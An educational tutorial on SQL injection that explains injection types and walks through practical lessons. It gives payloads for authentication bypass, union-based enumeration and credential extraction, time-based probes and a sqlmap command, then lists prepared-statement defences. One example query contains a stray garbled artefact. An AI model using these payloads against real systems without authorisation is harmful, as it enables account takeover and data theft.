# SQL Injection (SQLi) Fundamentals

## 1. What is SQL Injection?

SQL Injection (SQLi) is a web vulnerability that occurs when an application fails to properly validate user input before using it in a database query.

An attacker can manipulate input fields to alter the intended SQL query and interact directly with the database.

Successful SQL injection can allow:

- Authentication bypass
- Data extraction
- Data modification
- Account takeover
- Full database compromise

In severe cases, it can lead to remote code execution depending on the database configuration.

---

## 2. How Web Applications Use Databases

Most web applications store data in a database.

Example login logic:

1. User submits username and password.
2. Application builds a SQL query.
3. Database checks for a matching record.
4. If a match exists, login succeeds.

Example vulnerable query:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```

If user input is not sanitised, attackers can manipulate the query structure.

---

## 3. How SQL Injection Happens

Imagine the application builds a query like this:

```sql
SELECT * FROM users WHERE username = ':contentReference[oaicite:0]{index=0}password';
```

If an attacker enters:

```
admin' --
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```

`--` starts a SQL comment, meaning everything after it is ignored.

The password check is removed.

This may allow login without knowing the password.

---

## 4. Types of SQL Injection

### 1. Authentication Bypass

Example payload:

```
' OR '1'='1
```

Resulting query:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

Because `'1'='1'` is always true, authentication may succeed.

---

### 2. Union-Based SQL Injection

Allows attackers to retrieve additional data using `UNION`.

Example:

```
' UNION SELECT null, database() --
```

Used to extract:

- Database names
- Table names
- Column names
- User credentials

---

### 3. Error-Based SQL Injection

Relies on database error messages to reveal information.

Example:

```
'
```

If an error reveals:

```
You have an error in your SQL syntax near...
```

The application may be vulnerable.

---

### 4. Blind SQL Injection

Occurs when no visible error or output is shown.

Attackers infer results based on:

- Page behaviour
- Time delays
- Boolean responses

Example (Boolean-based):

```
' AND 1=1 --
```

vs

```
' AND 1=2 --
```

If responses differ, injection is likely possible.

---

### 5. Time-Based SQL Injection

Uses delays to confirm injection.

Example (MySQL):

```sql
' AND SLEEP(5) --
```

If the page pauses for 5 seconds, the query executed successfully.

---

# Practical Lessons

## Lesson 1 – Identify Input Points

Look for:

- Login forms
- Search fields
- URL parameters
- ID-based queries (e.g., `?id=1`)

Test with a single quote:

```
'
```

If the page breaks or shows a database error, injection may be possible.

---

## Lesson 2 – Test for Authentication Bypass

Try:

```
' OR '1'='1
```

Observe:

- Does login succeed?
- Does behaviour change?

---

## Lesson 3 – Identify Database Type

Test version extraction:

MySQL:

```
' UNION SELECT @@version --
```

PostgreSQL:

```
' UNION SELECT version() --
```

Microsoft SQL Server:

```
' UNION SELECT @@version --
```

Understanding the database type helps tailor payloads.

---

## Lesson 4 – Enumerate Database Structure

Common enumeration steps:

1. Find number of columns:

```
' ORDER BY 1 --
' ORDER BY 2 --
```

Increase until error occurs.

2. Identify injectable columns using:

```
' UNION SELECT null, null, null --
```

Adjust number of `null` values to match column count.

---

## Lesson 5 – Extract Data

Example extracting usernames and passwords:

```
' UNION SELECT username, password FROM users --
```

If output is reflected on the page, data extraction is possible.

---

# 6. Automated Testing with sqlmap

Manual testing builds understanding, but automation helps scale.

Example:

```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```

This attempts to enumerate databases automatically.

---

# 7. Defensive Measures

To prevent SQL Injection:

- Use parameterised queries (prepared statements)
- Avoid string concatenation in SQL
- Validate and sanitise input
- Use least privilege database accounts
- Disable verbose database errors in production
- Implement Web Application Firewalls (WAF)

Example (secure query using prepared statements):

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

---

# Key Security Takeaways

- SQL Injection targets the database layer.
- Unsanitised input is the root cause.
- Authentication bypass is only one form.
- Blind SQLi can be just as dangerous.
- Prepared statements are the most reliable defense.

---

## Summary

SQL Injection is a critical web vulnerability that allows attackers to manipulate database queries. By understanding how applications construct SQL statements and how input is processed, testers can identify and exploit injection points while developers can implement proper safeguards.
